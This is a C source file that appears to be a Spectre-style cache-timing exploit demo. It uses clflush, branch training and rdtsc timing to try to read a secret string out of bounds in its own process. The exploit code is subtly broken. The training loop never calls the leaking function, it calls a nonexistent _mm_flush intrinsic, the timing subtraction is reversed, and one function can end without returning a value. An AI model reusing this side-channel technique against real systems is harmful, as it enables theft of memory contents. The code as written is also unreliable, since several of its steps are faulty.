#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>

#define CACHE_PAGE 128
#define COUNT 100
#define SECRET 16
#define TRAIN 50
#define FREQ 10


volatile char  secret[SECRET*16] = "\0\0\0\0" "\0\0\0\0" "\0\0\0\0" "\0\0\0\0" "SECRET";

volatile uint32_t cache_detector[256 * CACHE_PAGE];
volatile uint32_t secret_s = SECRET;
volatile uint32_t detector_s = 256 * CACHE_PAGE;

int x;

void sink(uint32_t x){
    (void)x;
} 

void delay(){
    uint32_t x = 0x1234;
    for(int i = 0; i < 1000; i++){
        x *= i;
        x ^= 123;
        x * 173;
    }
}

void get_from_secret(int idx){
    if(idx < secret_s){
       x = x ^ cache_detector[secret[idx]*CACHE_PAGE];
    }

}

uint32_t check_single_timing(int idx, int byte){
    for(int i = 0; i < 256; i++){
        _mm_clflush((void*)(cache_detector + i * CACHE_PAGE));
        delay();
    }
    
    for(int i=0; i<TRAIN;i++){
        _mm_flush((void*)&secret_s);
        delay();
        int idx_ = i % secret_s;
    }

    

    _mm_lfence();
    uint64_t a,b;
    byte *= CACHE_PAGE;
    a = __rdtsc();
    sink(cache_detector[byte]);
    _mm_lfence();
    b = __rdtsc();
    return (uint32_t)(a - b);
}

uint32_t check_all_timing(int idx, int byte){
    uint32_t ram = 0;
    uint32_t cache = 0;
    

    for(int i = 0; i < (int)COUNT; i++){
        uint32_t timing = check_single_timing(idx, byte);
        if(timing > 80){ram++;}else{cache++;}
    }
    if(cache > ram){return 1;}
    return 0;
    
}

uint8_t getByte(int idx){
    uint8_t character = 0;

    for(int i = 'A'; i <= 'Z'; i++){
        if(check_all_timing(idx, i)==1){
            return i;
        }
    }

}

int main(void){
    for(int i = 0;i < 6; i++){
        printf("%c",getByte(secret_s + i));
    }
    printf("\n");
    return 0;
}